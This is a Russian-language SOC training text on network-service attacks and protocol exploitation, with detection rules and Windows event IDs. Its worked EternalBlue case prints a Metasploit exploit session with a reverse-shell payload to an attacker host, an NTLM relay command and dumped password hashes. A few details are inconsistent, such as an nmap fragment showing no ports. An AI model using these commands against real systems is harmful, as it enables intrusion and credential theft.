# Атаки на сетевые службы и эксплуатация протоколов

## 1. Сущность атак на сетевые службы и эксплуатации протоколов: определения и разграничения

Атака на сетевую службу — любое вредоносное действие, направленное против серверного или клиентского программного обеспечения, предоставляющего сервисы по сети (HTTP, FTP, SMB, RDP, DNS, SMTP и т. д.). Целью может быть нарушение доступности (Denial of Service), несанкционированный доступ, повышение привилегий или кража данных. Эксплуатация протоколов — более узкое понятие: использование логических ошибок, ошибок реализации или криптографических слабостей в проекте или коде конкретного протокола (SMBv1, TLS 1.0, DNS, NTLM и др.) для достижения атакующего эффекта. Эксплуатация протокола часто лежит в основе атаки на службу, но не исчерпывает всех её видов — например, подбор паролей к RDP‑серверу не эксплуатирует уязвимость самого протокола, а лишь злоупотребляет механизмом аутентификации.

В практике SOC L1 важно различать эти категории, поскольку индикаторы компрометации (IoC) и реакция различаются: атака на службу чаще фиксируется по аномалиям в количестве запросов или ответам с ошибками, а эксплуатация протокола — по специфическим сигнатурам вредоносных пакетов или нестандартному поведению стека.

Ниже приведена таблица, сопоставляющая основные классы атак с точки зрения задействованных механизмов и типичных признаков.

| Класс атаки | Уровень воздействия | Примеры уязвимостей/векторов | Индикаторы (для SOC) |
|-------------|----------------------|-------------------------------|-----------------------|
| **DoS/DDoS** (отказ в обслуживании) | Исчерпание канальных или вычислительных ресурсов службы | ICMP‑флуд, SYN‑флуд, HTTP‑флуд, amplification (DNS, NTP) | Резкий рост количества пакетов, множество незавершённых соединений, падение доступности сервиса |
| **Brute‑force / Password spraying** | Механизмы аутентификации конкретной службы (RDP, SSH, SMTP, IMAP) | Слабые пароли или учётные записи по умолчанию | Множественные события неудачного входа (EventID 4625), подключения с разных IP, сканирование портов |
| **Удалённое выполнение кода (RCE) через уязвимость службы** | Ошибки обработки запросов, переполнение буфера, десериализация | CVE‑2019‑0708 (BlueKeep, RDP), CVE‑2017‑0144 (EternalBlue, SMBv1), CVE‑2021‑44228 (Log4Shell) | Специфический трафик на порт, создание подозрительных процессов, внезапное появление новых служб |
| **Эксплуатация протокола (protocol exploitation)** | Логические дефекты или криптографические слабости в реализации протокола | Downgrade‑атаки на TLS, NTLM Relay, ARP‑спуфинг, DNS cache poisoning | Нестандартные поля протокола, аномальные последовательности флагов, неожиданные редиректы |
| **Man‑in‑the‑Middle (MITM)** | Перехват и модификация трафика между клиентом и службой | ARP spoofing, rogue DHCP, SSL stripping | Появление дублирующихся MAC‑адресов, аномалии ARP‑таблиц, ошибки сертификатов, внезапные переходы на HTTP |

Для иллюстрации, как SOC‑аналитик впервые сталкивается с признаками атаки, приведём фрагмент лога сетевого сканирования служб, выполненного злоумышленником при помощи `nmap`. Такой вывод часто является первым артефактом, регистрируемым сенсорами периметра.

```bash
# фрагмент вывода nmap -sS -sV -p 445,3389,22 192.168.10.0/24

Nmap scan report for 192.168.10.50
```

Наличие открытых портов 445 (SMB) и 3389 (RDP) с указанием версий прямо свидетельствует о том, что злоумышленник проводит разведку сетевых служб, которая часто предшествует либо атаке на службу (подбор паролей, DoS), либо попытке эксплуатации протокола (EternalBlue).

## 2. Внутреннее устройство атак: классы и механизмы эксплуатации протоколов

Атаки на сетевые службы, эксплуатирующие протокольные уязвимости, можно классифицировать по техническому корню проблемы и методу воздействия. Ниже перечислены основные классы, сгруппированные по природе дефекта.

**Переполнение буфера (Buffer Overflow).** Классический вектор, при котором злоумышленник посылает специально сформированный пакет, содержащий данные, превышающие размер выделенного буфера в коде обработчика протокола. Это позволяет перезаписать адрес возврата и передать управление на shell‑код. Исторические примеры: Code Red (HTTP GET‑запросы к IIS), Heartbleed (CVE‑2014‑0160 — утечка памяти в OpenSSL, вызванная отсутствием проверки границ в heartbeat‑расширении TLS). Heartbleed не даёт прямого выполнения кода, но позволяет удалённо читать память сервера, что может раскрыть приватные ключи.

**Целочисленные переполнения и ошибки знака.** Возникают при арифметических операциях над полями заголовков (длина данных, смещения). Например, в SMBv1 уязвимость EternalBlue (CVE‑2017‑0144) вызвана некорректной проверкой размера буфера при обработке транзакций записи в каналы (`SMB_COM_TRANSACTION2`). Злоумышленник отправляет пакет с большим значением поля `ByteCount`, которое неправильно обрабатывается в драйвере `srv.sys`, что ведёт к переполнению кучи (heap overflow).

**State‑exhaustion атаки.** Протоколы с состоянием (TCP, SMB, DNS с отслеживанием сессий) могут быть атакованы путём создания множества незавершённых или полуоткрытых состояний. SYN‑флуд — типичный пример: сервер выделяет TCB (Transmission Control Block) для каждого SYN‑пакета и хранит его, пока не истечёт таймаут, что исчерпывает память. В случае DNS подобные атаки используют открытые рекурсивные резолверы для генерации огромного количества запросов (amplification).

**Инъекции в поля протокола.** Протоколы, включающие интерпретируемые метасимволы (например, LDAP‑инъекция, инъекции в заголовки HTTP), позволяют подменять логику запроса. Атака Log4Shell (CVE‑2021‑44228) — эксплуатация того, что библиотека логирования Log4j интерпретировала строки вида `${jndi:ldap://...}`, подставленные в любое поле протокола (заголовок User‑Agent, X‑Forwarded‑For и т. п.), что приводило к загрузке и выполнению кода с удалённого LDAP‑сервера.

**Криптографические downgrade‑атаки.** Атакующий модифицирует рукопожатие TLS/SSL, вынуждая клиента и сервер использовать устаревший, уязвимый шифр‑набор. Примеры: POODLE (CVE‑2014‑3566) — атака на SSL 3.0 с использованием padding‑oracle в режиме CBC; BEAST (CVE‑2011‑3389) — эксплуатация особенностей CBC в TLS 1.0. В результате злоумышленник может расшифровать HTTPS‑сессии.

**Атаки на аутентификацию и делегирование.** Протоколы вроде NTLM и Kerberos особенно уязвимы к relay‑атакам. NTLM Relay позволяет атакующему передать перехваченный challenge‑response от жертвы на другой сервис, добившись аутентификации без знания пароля. Техника раскрутки (Pass‑the‑Hash) эксплуатирует тот факт, что Windows принимает NTLM‑хэш наравне с паролем. Атака Kerberoasting использует возможность запроса TGS (Ticket Granting Service) для любой учётной записи с SPN и последующего offline‑перебора пароля по полученному билету.

Для наглядности приведём структуру ключевого уязвимого поля в SMB‑пакете, используемого в EternalBlue. Это иллюстрация того, как злоумышленник кодирует вредоносные данные.

```text
SMB_COM_TRANSACTION2 Subcommand: TRANS2_OPEN2
   ...
   ByteCount: 0xFFFF          ← поле длины данных (16 бит)
   Data: [переполняющий буфер payload]...
```

Некорректная проверка `ByteCount` допускает копирование данных, размер которых превышает размер выделенного блока кучи. Это — типичный пример эксплуатации протокола через нарушение инвариант структуры.

Следующая таблица систематизирует основные классы протокольных дефектов вместе с предпосылками эксплуатации и известными примерами.

| Класс уязвимости | Необходимые предпосылки | Типичный индикатор в трафике / логах | Примеры (CVE) |
|------------------|--------------------------|----------------------------------------|---------------|
| Переполнение буфера в обработчике | Серверная компонента, написанная на C/C++ без защитных механизмов (ASLR, DEP) | Пакеты с аномально длинными полями, последующий запуск `cmd.exe` / `powershell` | CVE‑2017‑0144 (EternalBlue), CVE‑2014‑0160 (Heartbleed) |
| Целочисленное переполнение | Слаботипизированные операции над длиной данных во встраиваемых системах или драйверах | Пакеты с Field Length > 64K, аварийное завершение службы | CVE‑2017‑0144 (часть техники), несколько уязвимостей в ISC DHCP |
| State‑exhaustion | Асимметрия стоимости обработки запроса (один SYN — много ресурсов) | Лавинообразный рост полуоткрытых соединений, TIME_WAIT сокетов | SYN Flood (нет CVE, вектор классический) |
| Инъекции в поля протокола | Протокол, допускающий интерпретацию служебных символов без экранирования (HTTP, LDAP, JNDI) | Строки `uid=jndi:ldap://` в любом заголовке, аномальные LDAP-подключения к внешним серверам | CVE‑2021‑44228 (Log4Shell) |
| Криптографический downgrade | Наличие устаревших версий TLS/SSL на клиенте/сервере; отсутствие защиты от модификации Handshake | Переход от TLS 1.2 к SSLv3, аномальные ответы сервера с ошибками шифрования | CVE‑2014‑3566 (POODLE), CVE‑2011‑3389 (BEAST) |
| NTLM Relay / Pass‑the‑Hash | Использование одноранговой аутентификации без дополнительной защиты (подпись, EPA) | События входа с одного IP, но разных учётных записей; TGS‑запросы к DC на нетипичных портах | Base‑техника, оформляется как набор MITRE T1557, T1550.002 |

## 3. Применение и работа с атаками: инструментарий и процедуры детектирования

В работе SOC аналитика L1 встреча с атаками на сетевые службы и эксплуатацией протоколов начинается, как правило, с оповещений от систем обнаружения вторжений (IDS/IPS) или с аномалий в потоке событий SIEM. Рассмотрим типовой инструментарий и процедуры.

**Сканирование и идентификация служб.** Злоумышленник (или пентестер) использует `nmap`, `masscan`, `zmap` для быстрой инвентаризации. SOC может настроить оповещения на массовое сканирование портов (например, правило Firewall превышения числа запросов с одного IP за минуту). Пример:

```bash
# nmap с детектированием уязвимостей SMB
nmap --script smb-vuln-ms17-010 -p 445 192.168.10.12
```

Вывод скрипта `smb-vuln-ms17-010` явно сообщит «VULNERABLE», что ляжет в основу эскалации.

**Эксплуатация EternalBlue через Metasploit.** После идентификации уязвимого хоста атакующий запускает модуль `exploit/windows/smb/ms17_010_eternalblue`, который формирует вредоносный SMB‑пакет, провоцирующий переполнение и выполнение shell‑кода. Код фрагмента консоли:

```ruby
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.10.12
RHOST => 192.168.10.12
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.99.0.5
LHOST => 10.99.0.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
[*] Started reverse TCP handler on 10.99.0.5:4444
[*] 192.168.10.12:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.10.12:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.10.12:445    - Sending exploit...
[*] Sending stage (200262 bytes) to 192.168.10.12
[*] Meterpreter session 1 opened (10.99.0.5:4444 -> 192.168.10.12:49158) at 2025-01-15 14:22:31 +0000
```

С точки зрения защитной стороны, такие сессии вызывают алерты на уровне сетевого трафика (обнаружение эксплуатации SMB) и на уровне хоста (появление нового процесса, обратное соединение на нестандартный порт).

**Инструменты релея NTLM.** Для эксплуатации протокольного механизма аутентификации часто используется набор Impacket (например, `ntlmrelayx.py`). Он перехватывает HTTP‑запросы с NTLM‑аутентификацией и передаёт их на уязвимый SMB‑сервер, добиваясь доступа к ресурсу. Пример запуска:

```bash
python3 ntlmrelayx.py -t smb://192.168.10.50 -smb2support --no-wcf-server -of captured
```

В результате SOC‑аналитик может увидеть в логах цепочку событий: успешный вход (EventID 4624) с неожиданного хоста без соответствующей предшествующей проверки подлинности.

**Детектирование через IDS и SIEM.** Правила Suricata или Snort для отслеживания эксплуатации протоколов выглядят как сигнатуры, нацеленные на аномалии в SMB‑заголовках. Иллюстративная схема правила Suricata для EternalBlue:

```signature
alert smb any any -> $HOME_NET 445 (msg:"ET EXPLOIT MS17-010 EternalBlue SMBv1 Trans2 Buffer Overflow Attempt"; flow:to_server,established; content:"|00 00 00 00|"; offset:4; depth:4; content:"|FF|SMB|A0|"; within:5; content:"|00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF|"; distance:0; sid:2023456; rev:1;)
```

Эта сигнатура ищет в пакетах последовательность байт, характерную для уязвимого вызова TRANS2. При срабатывании генерируется alert, по которому L1‑аналитик начинает разбор инцидента.

**Сбор и анализ хостовых артефактов.** Для подтверждения эксплуатации службы используются логи Windows: EventID 7045 (установка новой службы), EventID 4688 (создание процесса), EventID 5156 (сетевое соединение, разрешённое Windows Filtering Platform). Фрагмент выгрузки EventID 7045:

```text
Log Name:      System
Source:        Service Control Manager
Date:          15.01.2025 14:22:35
Event ID:      7045
Task Category: None
Level:         Information
Keywords:      Classic
User:          SYSTEM
Description:
A service was installed in the system.

Service Name:  meterpreter
Service File Name:  %COMSPEC% /c start meterpreter...
Service Type:  user mode service
Service Start Type:  demand start
```

Связка с логами Sysmon (EventID 1 — создание процесса) позволяет восстановить полную картину: какой процесс запустил службу, какие дочерние процессы были созданы (cmd.exe → powershell.exe с аргументами вредоносного скрипта).

## 4. Сквозной практический пример: эксплуатация EternalBlue и расследование инцидента

**Исходные условия:** локальная сеть с несколькими компьютерами под управлением Windows 7 SP1 без обновления MS17‑010, включённый SMBv1, файрвол не блокирует внутренние обращения на порт 445. Злоумышленник (или красная команда) находится в том же широковещательном домене (IP 10.99.0.5). Цель — получить доступ к файловому серверу `192.168.10.12` и собрать учётные данные.

**Шаг 1. Сетевая разведка и верификация уязвимости.** Злоумышленник выполняет сканирование сети класса C и детектирует открытый порт 445. Затем запускает NSE‑скрипт для обнаружения MS17‑010.

```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.10.12
```

Вывод:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-15 14:20 UTC
Nmap scan report for 192.168.10.12
Host is up (0.0015s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (MS17-010).
```

Результат явно указывает на уязвимость — это критический индикатор для немедленной эскалации в SOC.

**Шаг 2. Эксплуатация и получение Meterpreter‑сессии.** Злоумышленник использует Metasploit для запуска эксплойта EternalBlue и выполнения нагрузки, которая устанавливает обратное соединение.

```ruby
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.10.12
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.99.0.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
[*] Started reverse TCP handler on 10.99.0.5:4444
[*] 192.168.10.12:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.10.12:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.10.12:445    - Sending exploit...
[*] Sending stage (200262 bytes) to 192.168.10.12
[*] Meterpreter session 1 opened (10.99.0.5:4444 -> 192.168.10.12:49158)
```

Сессия открыта. Атакующий получает консоль на удалённой системе с привилегиями NT AUTHORITY\SYSTEM.

**Шаг 3. Сбор учётных данных.** Внутри сессии выполняется дамп хэшей паролей с помощью встроенного модуля `hashdump`, либо ручной командой `mimikatz`.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
JohnS:1001:aad3b435b51404eeaad3b435b51404ee:f3c4967e22e2b5a7d48a8a5e3d3b1a2d:::
```

Наличие NTLM‑хэша администратора позволит злоумышленнику перемещаться по сети с помощью Pass‑the‑Hash.

**Шаг 4. Детектирование на стороне SOC.** Аналитик L1 получает несколько оповещений от IDS. Первое: сигнатура Suricata на эксплуатацию EternalBlue (правило `sid:2023456`). Второе: Windows событие EventID 7045 о создании службы `meterpreter`. Фрагмент выгрузки событий с помощью `wevtutil`:

```powershell
wevtutil qe System /q:"*[System[EventID=7045]]" /c:1 /f:text
```

Результат (иллюстративная схема):

```
Event[0]:
  Log Name: System
  Source: Service Control Manager
  Date: 2025-01-15T14:22:35.000
  Event ID: 7045
  Level: Information
  User: N/A
  Description:
    A service was installed in the system.
    Service Name: meterpreter
    Service File Name: %COMSPEC% /c start meterpreter...
```

Третье оповещение: запись Sysmon EventID 1 (создание процесса) с аргументами `cmd.exe` и `powershell -enc ...`. Аналитик связывает инциденты: атака началась с сетевого эксплойта, который привёл к закреплению через службу. По временной линии: сначала срабатывание IDS → затем появление Meterpreter‑сессии → далее запуск cmd. SOC изолирует машину от сети и инициирует процедуру реагирования.

**Вывод по примеру:** реальная атака на сетевую службу SMB, использующая эксплуатацию протокола SMBv1, позволила злоумышленнику получить права системы и украсть хэши паролей. Корреляция сетевых и хостовых артефактов демонстрирует необходимость многоуровневого мониторинга и быстрой обработки алертов.
